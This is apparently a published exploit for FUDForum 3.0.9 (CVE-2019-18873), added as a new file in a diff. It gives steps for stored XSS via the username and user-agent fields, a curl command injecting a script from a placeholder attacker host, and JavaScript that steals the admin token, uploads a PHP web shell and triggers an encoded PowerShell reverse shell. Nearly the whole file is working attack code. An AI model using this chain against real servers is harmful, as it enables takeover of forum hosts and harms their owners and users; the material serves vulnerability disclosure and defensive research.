@@ -1,0 +1,103 @@
+# Exploit Title : FUDForum 3.0.9 - Remote Code Execution
+# Date: 2019-10-26
+# Exploit Author: liquidsky (JMcPeters)
+# Vulnerable Software: FUDForum 3.0.9
+# Vendor Homepage: https://sourceforge.net/projects/fudforum/
+# Version: 3.0.9
+# Software Link: https://sourceforge.net/projects/fudforum/files/FUDforum_3.0.9.zip/download
+# Tested On: Windows / mysql / apache
+# Author Site: https://github.com/fuzzlove/FUDforum-XSS-RCE
+# Demo: https://youtu.be/0gsJQ82TXw4 | https://youtu.be/fR8hVK1paks
+# CVE: CVE-2019-18873
+
+
+// Greetz : wetw0rk, Fr13ndz, offsec =)
+//
+// Description: Multiple Stored XSS vulnerabilities have been found in FUDforum 3.0.9 that may result in remote code execution.
+//              The areas impacted are the admin panel and the forum.
+//
+//  XSS via username in Forum:
+//  1.  Register an account and log in to the forum.
+//  2.  Go to the user control panel. -> Account Settings -> change login
+//  3.  Insert javascript payload <script/src="http://attacker.machine/fud.js"></script>
+//  4.  When the admin visits the user information the payload will fire, uploading a php shell on the remote system.
+//
+//  XSS via user-agent in Admin Panel:
+//  1.  Register an account and log in to the forum. If you have an IP already associated with a registered user this is not required. This step is so when you run the XSS payload from your attacker machine it gets logged under the user activity.
+//  2.  Send the XSS payload below (from an IP associated with an account) / host the script:
+//  3.  curl -A '<script src="http://attacker.machine/fud.js"></script>' http://target.machine/fudforum/index.php
+//  4.  When the admin visits the user information from the admin controls / User Manager the payload will fire under "Recent sessions", uploading a php shell on the remote system.
+//
+
+function patience()
+{
+	var u=setTimeout("grabShell()",5000);
+}
+
+// This function is to call the reverse shell php script (liquidsky.php).
+// currently using a powershell payload that will need to be modified.
+function grabShell()
+{
+	var url ="/fudforum/liquidsky.php?cmd=%70%6f%77%65%72%73%68%65%6c%6c%20%2d%45%6e%63%6f%64%65%64%43%6f%6d%6d%61%6e%64%20%4a%41%42%6a%41%47%77%41%61%51%42%6c%41%47%34%41%64%41%41%67%41%44%30%41%49%41%42%4f%41%47%55%41%64%77%41%74%41%45%38%41%59%67%42%71%41%47%55%41%59%77%42%30%41%43%41%41%55%77%42%35%41%48%4d%41%64%41%42%6c%41%47%30%41%4c%67%42%4f%41%47%55%41%64%41%41%75%41%46%4d%41%62%77%42%6a%41%47%73%41%5a%51%42%30%41%48%4d%41%4c%67%42%55%41%45%4d%41%55%41%42%44%41%47%77%41%61%51%42%6c%41%47%34%41%64%41%41%6f%41%43%63%41%4d%51%41%35%41%44%49%41%4c%67%41%78%41%44%59%41%4f%41%41%75%41%44%49%41%4f%41%41%75%41%44%45%41%4e%51%41%79%41%43%63%41%4c%41%41%30%41%44%51%41%4d%77%41%70%41%44%73%41%4a%41%42%7a%41%48%51%41%63%67%42%6c%41%47%45%41%62%51%41%67%41%44%30%41%49%41%41%6b%41%47%4d%41%62%41%42%70%41%47%55%41%62%67%42%30%41%43%34%41%52%77%42%6c%41%48%51%41%55%77%42%30%41%48%49%41%5a%51%42%68%41%47%30%41%4b%41%41%70%41%44%73%41%57%77%42%69%41%48%6b%41%64%41%42%6c%41%46%73%41%58%51%42%64%41%43%51%41%59%67%42%35%41%48%51%41%5a%51%42%7a%41%43%41%41%50%51%41%67%41%44%41%41%4c%67%41%75%41%44%59%41%4e%51%41%31%41%44%4d%41%4e%51%42%38%41%43%55%41%65%77%41%77%41%48%30%41%4f%77%42%33%41%47%67%41%61%51%42%73%41%47%55%41%4b%41%41%6f%41%43%51%41%61%51%41%67%41%44%30%41%49%41%41%6b%41%48%4d%41%64%41%42%79%41%47%55%41%59%51%42%74%41%43%34%41%55%67%42%6c%41%47%45%41%5a%41%41%6f%41%43%51%41%59%67%42%35%41%48%51%41%5a%51%42%7a%41%43%77%41%49%41%41%77%41%43%77%41%49%41%41%6b%41%47%49%41%65%51%42%30%41%47%55%41%63%77%41%75%41%45%77%41%5a%51%42%75%41%47%63%41%64%41%42%6f%41%43%6b%41%4b%51%41%67%41%43%30%41%62%67%42%6c%41%43%41%41%4d%41%41%70%41%48%73%41%4f%77%41%6b%41%47%51%41%59%51%42%30%41%47%45%41%49%41%41%39%41%43%41%41%4b%41%42%4f%41%47%55%41%64%77%41%74%41%45%38%41%59%67%42%71%41%47%55%41%59%77%42%30%41%43%41%41%4c%51%42%55%41%48%6b%41%63%41%42%6c%41%45%34%41%59%51%42%74%41%47%55%41%49%41%42%54%41%48%6b%41%63%77%42%30%41%47%55%41%62%51%41%75%41%46%51%41%5a%51%42%34%41%48%51%41%4c%67%42%42%41%46%4d%41%51%77%42%4a%41%45%6b%41%52%51%42%75%41%47%4d%41%62%77%42%6b%41%47%6b%41%62%67%42%6e%41%43%6b%41%4c%67%42%48%41%47%55%41%64%41%42%54%41%48%51%41%63%67%42%70%41%47%34%41%5a%77%41%6f%41%43%51%41%59%67%42%35%41%48%51%41%5a%51%42%7a%41%43%77%41%4d%41%41%73%41%43%41%41%4a%41%42%70%41%43%6b%41%4f%77%41%6b%41%48%4d%41%5a%51%42%75%41%47%51%41%59%67%42%68%41%47%4d%41%61%77%41%67%41%44%30%41%49%41%41%6f%41%47%6b%41%5a%51%42%34%41%43%41%41%4a%41%42%6b%41%47%45%41%64%41%42%68%41%43%41%41%4d%67%41%2b%41%43%59%41%4d%51%41%67%41%48%77%41%49%41%42%50%41%48%55%41%64%41%41%74%41%46%4d%41%64%41%42%79%41%47%6b%41%62%67%42%6e%41%43%41%41%4b%51%41%37%41%43%51%41%63%77%42%6c%41%47%34%41%5a%41%42%69%41%47%45%41%59%77%42%72%41%44%49%41%49%41%41%67%41%44%30%41%49%41%41%6b%41%48%4d%41%5a%51%42%75%41%47%51%41%59%67%42%68%41%47%4d%41%61%77%41%67%41%43%73%41%49%41%41%6e%41%46%41%41%55%77%41%67%41%43%63%41%49%41%41%72%41%43%41%41%4b%41%42%77%41%48%63%41%5a%41%41%70%41%43%34%41%55%41%42%68%41%48%51%41%61%41%41%67%41%43%73%41%49%41%41%6e%41%44%34%41%49%41%41%6e%41%44%73%41%4a%41%42%7a%41%47%55%41%62%67%42%6b%41%47%49%41%65%51%42%30%41%47%55%41%49%41%41%39%41%43%41%41%4b%41%42%62%41%48%51%41%5a%51%42%34%41%48%51%41%4c%67%42%6c%41%47%34%41%59%77%42%76%41%47%51%41%61%51%42%75%41%47%63%41%58%51%41%36%41%44%6f%41%51%51%42%54%41%45%4d%41%53%51%42%4a%41%43%6b%41%4c%67%42%48%41%47%55%41%64%41%42%43%41%48%6b%41%64%41%42%6c%41%48%4d%41%4b%41%41%6b%41%48%4d%41%5a%51%42%75%41%47%51%41%59%67%42%68%41%47%4d%41%61%77%41%79%41%43%6b%41%4f%77%41%6b%41%48%4d%41%64%41%42%79%41%47%55%41%59%51%42%74%41%43%34%41%56%77%42%79%41%47%6b%41%64%41%42%6c%41%43%67%41%4a%41%42%7a%41%47%55%41%62%67%42%6b%41%47%49%41%65%51%42%30%41%47%55%41%4c%41%41%77%41%43%77%41%4a%41%42%7a%41%47%55%41%62%67%42%6b%41%47%49%41%65%51%42%30%41%47%55%41%4c%67%42%4d%41%47%55%41%62%67%42%6e%41%48%51%41%61%41%41%70%41%44%73%41%4a%41%42%7a%41%48%51%41%63%67%42%6c%41%47%45%41%62%51%41%75%41%45%59%41%62%41%42%31%41%48%4d%41%61%41%41%6f%41%43%6b%41%66%51%41%37%41%43%51%41%59%77%42%73%41%47%6b%41%5a%51%42%75%41%48%51%41%4c%67%42%44%41%47%77%41%62%77%42%7a%41%47%55%41%4b%41%41%70%41%41%6f%41";
+ 	xhr = new XMLHttpRequest();
+	xhr.open("GET", url, true);
+	xhr.send(null);
+
+}
+
+function submitFormWithTokenJS(token) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", '/fudforum/adm/admbrowse.php', true);
+
+    // Send the proper header information along with the request
+    xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary=-----------------------------9703186584101745941654835853");
+
+    var currentdir = "C:/xampp/htdocs/fudforum"; // webroot - forum directory
+    var fileName = "liquidsky.php";
+    var url      = "/fudforum/adm/admbrowse.php";
+    var ctype    = "application/x-php";
+    var fileData = "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>";
+    var boundary = "-----------------------------9703186584101745941654835853";
+    var fileSize = fileData.length;
+
+    var body = "--" + boundary + "\r\n";
+    body += 'Content-Disposition: form-data; name="cur"\r\n\r\n';
+    body += currentdir + "\r\n";
+    body += "--" + boundary + "\r\n";
+    body += 'Content-Disposition: form-data; name="SQ"\r\n\r\n';
+    body += token + "\r\n";
+    body += "--" + boundary + "\r\n";
+    body += 'Content-Disposition: form-data; name="fname"; filename="' + fileName + '"\r\n';
+    body += "Content-Type: " + ctype + "\r\n\r\n";
+    body += fileData + "\r\n\r\n";
+    body += "--" + boundary + "\r\n";
+    body += 'Content-Disposition: form-data; name="tmp_f_val"\r\n\r\n';
+    body += "1" + "\r\n";
+    body += "--" + boundary + "\r\n";
+    body += 'Content-Disposition: form-data; name="d_name"\r\n\r\n';
+    body += fileName + "\r\n";
+    body += "--" + boundary + "\r\n";
+    body += 'Content-Disposition: form-data; name="file_upload"\r\n\r\n';
+    body += "Upload File" + '\r\n';
+    body += "--" + boundary + "--";
+
+    xhr.send(body);
+}
+
+//Grab SQ token
+var req = new XMLHttpRequest();
+
+req.onreadystatechange=function()
+{
+  if (req.readyState == 4 && req.status == 200) {
+    var htmlPage = req.responseXML; /* fetch html */
+    var SQ = htmlPage.getElementsByTagName("input")[0]
+    submitFormWithTokenJS(SQ.value);
+  }
+}
+
+req.open("GET", "/fudforum/adm/admuser.php", true);
+req.responseType = "document";
+req.send();
+
+patience();
